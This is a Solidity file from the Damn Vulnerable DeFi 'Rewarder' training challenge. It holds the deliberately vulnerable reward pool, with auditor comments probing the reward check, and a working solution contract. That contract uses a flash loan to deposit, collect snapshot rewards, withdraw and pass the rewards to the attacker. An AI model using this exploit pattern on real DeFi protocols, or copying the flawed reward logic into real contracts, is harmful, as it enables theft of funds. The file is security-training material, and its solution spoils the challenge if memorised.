// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "./RewardToken.sol";
import "../DamnValuableToken.sol";
import "./AccountingToken.sol";
import "./FlashLoanerPool.sol";

/**
 * @title TheRewarderPool
 * @author Damn Vulnerable DeFi (https://damnvulnerabledefi.xyz)

 */
contract TheRewarderPool {
    // Minimum duration of each round of rewards in seconds
    uint256 private constant REWARDS_ROUND_MIN_DURATION = 5 days;

    //last snapshot id updated
    uint256 public lastSnapshotIdForRewards;

    //last timestamp when snapshot was updated
    uint256 public lastRecordedSnapshotTimestamp;

    //tracks time when is the reward was send to the particular user.
    mapping(address => uint256) public lastRewardTimestamps;

    // Token deposited into the pool by users
    DamnValuableToken public immutable liquidityToken;

    // Token used for internal accounting and snapshots
    // Pegged 1:1 with the liquidity token
    AccountingToken public accToken;

    // Token in which rewards are issued
    RewardToken public immutable rewardToken;

    // Track number of rounds
    uint256 public roundNumber;

    constructor(address tokenAddress) {
        // Assuming all three tokens have 18 decimals
        liquidityToken = DamnValuableToken(tokenAddress);
        accToken = new AccountingToken();
        rewardToken = new RewardToken();

        //safety for balance and supply
        _recordSnapshot();
    }

    /**
     * @notice sender must have approved `amountToDeposit` liquidity tokens in advance
     */
    function deposit(uint256 amountToDeposit) external {
        require(amountToDeposit > 0, "Must deposit tokens");

        // this is a standard mint function
        //snapshot is not updated
        accToken.mint(msg.sender, amountToDeposit);

        //why is it needed at this stage?
        //will this be update whenever one deposits some amount
        distributeRewards();

        require(
            liquidityToken.transferFrom(
                msg.sender,
                address(this),
                amountToDeposit
            )
        );
    }

    function withdraw(uint256 amountToWithdraw) external {
        accToken.burn(msg.sender, amountToWithdraw);
        require(liquidityToken.transfer(msg.sender, amountToWithdraw));
    }

    function distributeRewards() public returns (uint256) {
        uint256 rewards = 0;

        //last recorded time will be when the rewards were distributed.
        //snapshot will not be updated at begining
        if (isNewRewardsRound()) {
            _recordSnapshot();
        }

        // "totalSupplyAt" that particular snapshot, referenced by its ID.
        uint256 totalDeposits = accToken.totalSupplyAt(
            lastSnapshotIdForRewards
        );

        // "balanceOfAt" that particular snapshot, referenced by its ID.
        uint256 amountDeposited = accToken.balanceOfAt(
            msg.sender,
            lastSnapshotIdForRewards
        );

        if (amountDeposited > 0 && totalDeposits > 0) {
            rewards = (amountDeposited * 100 * 10 ** 18) / totalDeposits;

            if (rewards > 0 && !_hasRetrievedReward(msg.sender)) {
                rewardToken.mint(msg.sender, rewards);
                lastRewardTimestamps[msg.sender] = block.timestamp;
            }
        }

        return rewards;
    }

    //update the latest timestamp
    //increase the timestamp id
    function _recordSnapshot() private {
        //this simply tracks the number of times snapshot was taken
        //this will only get the snapshot id.
        lastSnapshotIdForRewards = accToken.snapshot();

        //record the snapshot by saving it in state variable.
        lastRecordedSnapshotTimestamp = block.timestamp;

        //similar to snapshot ID
        roundNumber++;
    }

    function _hasRetrievedReward(address account) private view returns (bool) {
        //lastRecordedSnapshotTimestamp is only updated when the "distribute reward" is hit.
        // "distribute reward" is only hit when deposit is made.

        //condition 1
        //first the time when the snapshot was taken.
        //then the time when the rewards were distributed.
        //There is no other place where the recordSnapshot is called.

        //condition 2
        //if the account has not reached the next reward waiting time (lastRecordedSnapshotTimestamp + REWARDS_ROUND_MIN_DURATION)
        //since last reward collection time (lastRewardTimestamps[account]), then we can say that
        //the user has recently retrived the reward

        //@audit - can we bypass this check. To always get false.
        //we cannot control lastRewardTimestamp[attacker]
        //can we control lastRecordedSnapshot?
        //we need :   lastRecordedSnapshotTimestamp > lastRewardTimestamps[account]
        // we need to trigger distributeRewards() -> _recordSnapshot() which will make it up to date.
        //but the problem is isNewRewardsRound() is causing an issue here.
        return (lastRewardTimestamps[account] >=
            lastRecordedSnapshotTimestamp &&
            lastRewardTimestamps[account] <=
            lastRecordedSnapshotTimestamp + REWARDS_ROUND_MIN_DURATION);
    }

    //this function is to check if the minimum staking time (REWARDS_ROUND_MIN_DURATION) is completed
    //the time since the reward
    function isNewRewardsRound() public view returns (bool) {
        return
            block.timestamp >=
            lastRecordedSnapshotTimestamp + REWARDS_ROUND_MIN_DURATION;
    }
}

contract theRewarderSolution {
    FlashLoanerPool public flashLoanPool;
    TheRewarderPool public theRewarderPool;
    DamnValuableToken public liquidityToken;
    RewardToken public rewardToken;
    address payable flashAddr;
    address payable rewardAddr;
    address payable damnAddr;
    address payable rTokenAddr;

    constructor(
        address payable addr1,
        address payable addr2,
        address payable addr3,
        address payable addr4
    ) {
        flashAddr = addr1;
        rewardAddr = addr2;
        damnAddr = addr3;
        rTokenAddr = addr4;
        flashLoanPool = FlashLoanerPool(flashAddr);
        theRewarderPool = TheRewarderPool(rewardAddr);
        liquidityToken = DamnValuableToken(damnAddr);
        rewardToken = RewardToken(rTokenAddr);
    }

    function initiate_attack(uint amount) public payable {
        flashLoanPool.flashLoan(amount);
        //at this stage the attackContract has received the reward token.
        //now we need to transfer the tokens to the attacker
        rewardToken.transfer(msg.sender, rewardToken.balanceOf(address(this)));
    }

    function receiveFlashLoan(uint amount) external {
        //define actions to do after flash loan
        //the attackerContract = msg.sender is the one carrying out the attack
        //approve the tokens for rewardAddr so that it can be deposited.
        liquidityToken.approve(rewardAddr, amount);

        //desposit the tokens
        //this deposit will call the distributeReward() which will add the extra rewaredTokens.
        theRewarderPool.deposit(amount);

        //this will burn
        theRewarderPool.withdraw(amount);

        liquidityToken.transfer(msg.sender, amount);
    }
}
